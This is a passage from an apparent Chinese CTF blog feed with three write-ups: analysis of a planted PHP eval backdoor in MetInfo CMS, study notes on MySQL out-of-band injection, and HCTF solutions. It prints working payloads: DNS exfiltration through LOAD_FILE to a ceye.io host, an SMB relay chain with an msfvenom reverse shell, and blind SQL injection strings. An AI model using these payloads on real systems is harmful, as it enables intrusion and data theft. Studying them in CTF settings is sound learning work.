<h2 id="0x04-主办方设置的后门利用"><a href="#0x04-主办方设置的后门利用" class="headerlink" title="0x04 主办方设置的后门利用"></a>0x04 主办方设置的后门利用</h2><p>对于这个后门，调试也是到了比赛结束后，about/show.php 30、31行</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">$show_tiny=create_function(<span class="string">""</span>, base64_decode(<span class="string">'QGV2YWwoJF9QT1NUWyJpY3FjdGZlciJdKTs='</span>));</span><br><span class="line">$show_tiny();</span><br></pre></td></tr></table></figure>
<p>解base64后得到的是一个自带后门：@eval($_POST[“icqctfer”]);<br>当时在现场的时候看到这个就直接在show.php后用POST传参icqctfer=<strong>****</strong>，没有得到任何想要的结果，当时还以为大家都补了，没有注意到源码中还有限制条件，主要是在show.php中的<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(!$id &amp;&amp; $class1)$id &#x3D; $class1;</span><br><span class="line">if(!is_numeric($id))okinfo(&#39;..&#x2F;404.html&#39;);</span><br><span class="line">$show &#x3D; $db-&gt;get_one(&quot;SELECT * FROM $met_column WHERE id&#x3D;&#39;$id&#39; and module&#x3D;1&quot;);</span><br><span class="line">if(!$show||!$show[&#39;isshow&#39;])&#123;</span><br><span class="line">okinfo(&#39;..&#x2F;404.html&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>is_numeric()函数要求变量id要是数字，这个地方比较好过，由于对$id没有做任何限制的，我们可以在本地调试测试，把变量id覆盖就好了，不过后面的查询语句也要求了id值得赋成1，payload:<a href="http://127.0.0.1/CTF/shanghai/default/about/show.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/CTF/shanghai/default/about/show.php?id=1</a><br>之后主要是$show变量的问题， $db-&gt;get_one(“SELECT * FROM $met_column WHERE id=’$id’ and module=1”)将表met_column的第一行信息以数组的方式赋值给变量show，本地查看数据库<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-640ee3a29ec2e4db.png" alt><br>其中isshow列默认值为 0<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-796a9719aa2b0afb.png" alt><br>而要过条件if(!$show||!$show[‘isshow’])只有当$show = 1或者$show[‘isshow’] = 1，而从数据库中看来使得$show = 1是不可能的，我们没法把对方的数据库id = 1的所有信息都置1，所以只有将$show[‘isshow’]置 1 。而要将变量$show[‘isshow’]置 1，需要进入Metinfo后台：设置-&gt;栏目 中修改about的参数，将 添加内容 段改成允许，就可以将isshow置为1,从而通过条件，就可以利用icqctfer了。<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-3166828be770c331.png" alt><br>那么问题来了，要想进后台修改配置利用这个后门，除非一上手在别人没改密码之前进入别人后台修改，等大家都把后台密码改了，也就只有通过重置数据库的方法进入后台，既然后重置数据库进入后台了，还不如上传木马来打，所以这个后门看似简单，其实用起来太麻烦，价值也不高。</p>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05 结语"></a>0x05 结语</h2><p>本菜因才疏学浅，只挖到了部分的洞，因为上次在场上的时候有师傅直接把网站页面给改写了，说明还有其他的利用点，这里膜一下，本文章只用来学习记录。</p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>AWD</tag>
        <tag>cms</tag>
      </tags>
  </entry>
  <entry>
    <title>一道题目引发的MySQL-Out-of-Band学习笔记</title>
    <url>/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>研究这个攻击方式主要是因为在近期的HCTF上遇到了这个漏洞点，之前一直没有什么时间来了解mysql，所以遇到的时候有点懵，不过题目考点只是OOB的一部分，所以花点时间把oob了解的深刻一点。</p>
<p>##0x01 什么是 Out-of-Band 注入<br> 讲得通俗一点就是通过其他方式来提取mysql数据，也就是带外攻击，比如可以通过DNS解析，HHTP，文件系统等</p>
<h2 id="0x02-MySQL的限制"><a href="#0x02-MySQL的限制" class="headerlink" title="0x02 MySQL的限制"></a>0x02 MySQL的限制</h2><p>oob攻击主要是针对MySQL 5.5.53以及之前的版本，在MySQL中存在一个全局变量：secure_file_priv,主要是用来限制数据写入和写出的，在5.5.53版本之前，变量的默认value是空，例如本次我测试的环境：<img src="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8418106-722d423dcb8ab1f3.png" alt></p>
<p>而5.5.53版本后secure_file_priv变量默认值为NULL，即我们不可以利用该变量进行数据写入写出操作，但有时有需要用到写入写出功能的时候，可以将secure_file_priv变量设置为空，例如，在my.ini中直接插入一条：secure_file_priv=     即可。</p>
<h2 id="0x03-利用INTO-OUTFILE等语句写出数据"><a href="#0x03-利用INTO-OUTFILE等语句写出数据" class="headerlink" title="0x03 利用INTO OUTFILE等语句写出数据"></a>0x03 利用INTO OUTFILE等语句写出数据</h2><p>利用INTO OUTFILE等语句可以将查询信息写出到文件中<br>windows下测试：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">select @@version into outfile <span class="string">'H:\\test.txt'</span>;</span><br><span class="line">select @@version into dumpfile <span class="string">'H:\\test.txt'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8418106-a07ddf60fed054ea.png" alt></p>
<h2 id="0x04-DNS解析获取数据"><a href="#0x04-DNS解析获取数据" class="headerlink" title="0x04 DNS解析获取数据"></a>0x04 DNS解析获取数据</h2><p>我们使用load_file()语句将数据信息导出到外部服务器上，例如DNS解析器，但mysql尝试解析DNF时，我们就可以在DNS解析式上获取到查询数据信息，这里贴一个DNS解析的API：<a href="http://ceye.io/records/dns" target="_blank" rel="noopener">http://ceye.io/records/dns</a><br>查询语句例如：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(<span class="string">'\\\\'</span>,version(),<span class="string">'.mysql.ip.port.8cs2vs.ceye.io\\abc'</span>));</span><br></pre></td></tr></table></figure>
<p>我们可以在DNS接口处看到成功获取到查询数据<br><img src="/2017/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84MySQL-Out-of-Band%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8418106-49b29c165bd155a2.png" alt></p>
<h2 id="0x05-SMB中继攻击"><a href="#0x05-SMB中继攻击" class="headerlink" title="0x05 SMB中继攻击"></a>0x05 SMB中继攻击</h2><p>这个攻击方式主要是利用mysql服务器通过load_file、into outfile/dumpfile、load data infile等函数向主机连接通信的时候（描述不一定准确），使用smbrelayx等工具将反向shell上传到主机中。smbrelayx工具下载地址：<a href="https://github.com/coresecurity/impacket" target="_blank" rel="noopener">https://github.com/coresecurity/impacket</a><br>利用kaili生成反向连接shell（win7环境）：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">172.20</span>.<span class="number">10.5</span> LPORT=<span class="number">443</span>  -f exe &gt; win64.exe</span><br></pre></td></tr></table></figure>
<p>启用smbrelayx.py</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">smbrelayx.py -h [攻击主机ip] -e ./win64.exe</span><br></pre></td></tr></table></figure>
<p>Metasploit上启用multi/handler模块，设置好payload，lhost，lport，在MySQL服务器上执行：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">select load_file(<span class="string">'\\\\172.20.10.5\\test'</span>);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>即可发起smb中继攻击，从而反向Getshell，由于MySQL版本的原因，此攻击利用率较低，不过也不乏有少数管理员将secure_file_priv变量开启利用，或者MySQL没有及时更新升级。</p>
<h2 id="0x06-参考文章"><a href="#0x06-参考文章" class="headerlink" title="0x06 参考文章"></a>0x06 参考文章</h2><p><a href="https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/" target="_blank" rel="noopener">Osanda Malith Jayathissa</a></p>
<p><strong>文章只用于个人学习记录</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>Out-of-Band</tag>
      </tags>
  </entry>
  <entry>
    <title>两天做了HCTF的最简单的题</title>
    <url>/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/</url>
    <content><![CDATA[<h3 id="0x00-poker2"><a href="#0x00-poker2" class="headerlink" title="0x00 poker2"></a>0x00 poker2</h3><p>这两天真的是沉迷游戏，不能自拔，刚开始进入游戏的时候，发现同目录有flag.php，要求游戏升到100级，就可以得到flag，那就是刷级了，结果一注册，发现送了成长礼包（后来才发现原来其他人没有），直接飙到90级，占据全服第一的位置一个上午。这题就是抓包重复刷怪就好了，只知道圣诞小屋经验高。这里直接贴脚本了</p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-2249f408b45e1c33.png" alt></p>
<p>简单的刷分脚本                                        </p>
<p>到了100级后到flag.php就直接得到flag：hctf{Go0dLuck_toGetTheFl3g__from_game}</p>
<p><strong>boring website</strong></p>
<p>扫描发现有<a href="http://www.zip，里面有index.php的源码" target="_blank" rel="noopener">www.zip，里面有index.php的源码</a></p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-3cf59e70e00511d7.png" alt>                                   </p>
<p>注入点很明显，就是在参数id那，数据库密码 ‘oob’ 提示这道题是MySQL Out-of-Band攻击，再加上注释的 //link server: On  linkname:mysql，目标数据库是SQL Server的，所以这里要用到OpenQuery表达式：OPENQUERY (  linked_server ,’query’ )，由于过滤了敏感字符，没法得到回显，主要参考文章：</p>
<p><a href="http://bobao.360.cn/learning/detail/3458.html，发现可以利用DNS解析提取数据，例如：select" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3458.html，发现可以利用DNS解析提取数据，例如：select</a>  load_file(concat(‘\’,version(),’.hacker.site\a.txt’));所以构造payload：id=1; select * from OpenQuery(mysql,’SELECT LOAD_FILE(CONCAT(“\”,(select  1),”.mysql.ip.port.8cs2vs.ceye.io\abc”))’);</p>
<p>在DNS解析平台可以得到反馈数据，那么就下来就是把(select 1)改成查库，查表，查字段/内容的语句就好了,主要还是学习了oob攻击一波，这里直接贴图：</p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-e8fd0904e57cdc6f.png" alt></p>
<p>得到flag：hctf{dn5-1og-can-take-f14g-6as84f}</p>
<h3 id="0x01-poker-poker"><a href="#0x01-poker-poker" class="headerlink" title="0x01 poker-poker"></a>0x01 poker-poker</h3><p>打开发现和level 2里的poker2是一样的，那就是一道题两个flag，在做level 2  的时候，就尝试过很多方法，抓包的时候发现带有很多参数，所以把包后甩sqlmap里跑了一下，在注册处的包有报存在注入，但是sqlmap都没法跑出来，带着测试一波的心理开始手动测试，发现username参数可以进行时间盲注，没有过滤，直接构造payload：</p>
<p>?bc=2&amp;bname=easdasd&amp;head=6&amp;pass=&amp;sex=2&amp;username= ’ and if( (ascii(substr((select database()),1))&gt;97),sleep(5)1)–+</p>
<p>发现不仅可以时间，还可以直接判断返回值来注，可以构造payload：</p>
<p>?bc=2&amp;bname=easdasd&amp;head=6&amp;pass=&amp;sex=2&amp;username=11111 ’ and if( (ascii(substr((select database()),1))&gt;97),0,1)–+  进行注入（这样写脚本方便点）</p>
<p>这里必须补充写下，直接查库是pm_hctf，查到第一个表是PasswordProtection</p>
<p>看到题目是的pspt，心里有点小高兴，结果花了好几个小时，把pm_hctf库下100多个表名都看了一遍，发现没有和flag有关的啊，最后重新查了下其他库，有个hctf，flag2表，真的是一把幸酸泪啊，直接贴脚本：</p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-dcb4fcdd43d1eead.png" alt>                                      </p>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-401387e4b93a4c11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>得到flag：hctf{y3u_G0t_tHe__poker_game}</p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>逻辑</tag>
      </tags>
  </entry>
</search>
